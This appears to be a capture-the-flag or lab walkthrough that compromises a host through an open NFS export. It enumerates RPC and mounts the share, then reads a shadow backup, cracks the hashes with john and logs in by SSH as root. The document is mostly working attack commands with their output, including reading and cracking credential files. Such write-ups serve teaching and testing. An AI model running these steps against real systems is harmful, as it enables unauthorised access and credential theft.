### Initial Discovery
```
# Nmap shows RPC
nmap -p 111 10.10.10.50
# 111/tcp open  rpcbind

# Enumerate RPC
rpcinfo -p 10.10.10.50
# 100003  4   tcp   2049  nfs
# 100005  1   udp  20048  mountd
```

#### Find NFS Exports
```
# Show NFS exports
showmount -e 10.10.10.50
# Export list for 10.10.10.50:
# /opt/backup *
# /var/log *

# Mount backup share
mkdir /tmp/backup
mount -t nfs 10.10.10.50:/opt/backup /tmp/backup -o nolock
```

#### Analyze Backup Files
```
**# List backup contents
ls -la /tmp/backup/
# shadow.bak
# passwd.bak

# Read shadow backup
cat /tmp/backup/shadow.bak
# root:$6$...:18555:0:99999:7:::
# user:$6$...:18555:0:99999:7:::

# Crack hashes
john --wordlist=rockyou.txt shadow.bak
# password123**
```

#### SSH with Cracked Password
```
# SSH as root
ssh root@10.10.10.50
# password123

# Or as user then sudo
ssh user@10.10.10.50
# password123
sudo -l
# (ALL) ALL
sudo su -
```

